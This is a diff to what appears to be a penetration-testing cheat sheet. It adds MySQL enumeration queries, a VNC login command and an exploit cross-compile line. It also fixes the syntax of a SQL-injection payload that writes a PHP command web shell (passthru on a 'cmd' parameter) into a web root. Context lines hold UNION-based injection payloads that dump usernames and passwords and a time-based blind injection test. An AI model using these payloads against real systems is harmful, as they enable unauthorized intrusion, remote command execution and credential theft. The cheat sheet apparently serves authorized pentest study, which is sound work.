@@ -769,6 +769,8 @@ https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon
 
 ```
 nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
+
+vncviewer 127.0.0.1:5000 -passwd secret
 ```
 
 ## WinRM - 5985
@@ -1102,7 +1104,6 @@ cat php_cmd.php
 https://portswigger.net/web-security/sql-injection
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 https://www.exploit-db.com/papers/17934
-https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 https://book.hacktricks.xyz/pentesting-web/sql-injection
 
@@ -1116,6 +1117,12 @@ https://book.hacktricks.xyz/pentesting-web/sql-injection
 '+UNION+SELECT+@@version,+NULL#
 SELECT * FROM information_schema.tables
 
+SHOW GRANTS;  #Get current user permissions
+
+SHOW VARIABLES; #Get variables related to the environment
+
+select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir; #MySQL database enumeration query
+
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  #List Tables
 
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  #List Columns
@@ -1125,7 +1132,7 @@ SELECT * FROM information_schema.tables
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--     #Concatenation for multiple vaules
 
 # SQL Web Shell
-'UNION SELECT ("<?php echo passthru($_GET['cmd'];") INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
+'UNION SELECT "<?php echo passthru($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
 
 # Blind Enumeration (https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html)
 ' IF (1=1) WAITFOR DELAY '0:0:10';--  #Evaluates to true and waits 10 secs
@@ -1781,6 +1788,7 @@ int main(void){
 
 # Compile
 gcc suid.c -o suid
+
 ```
 ### MSFVENOM LIBRARY Priv Esc
 ```
@@ -2226,6 +2234,8 @@ int main ()
 
 # Compile Exploit
 i686-w64-mingw32-gcc -o useradd.exe useradd.c
+
+i686-w64-mingw32-gcc 40564.c -o exp.exe -lws2_32 #Win cross compiler
 ````
 
 #### Powershell Run As
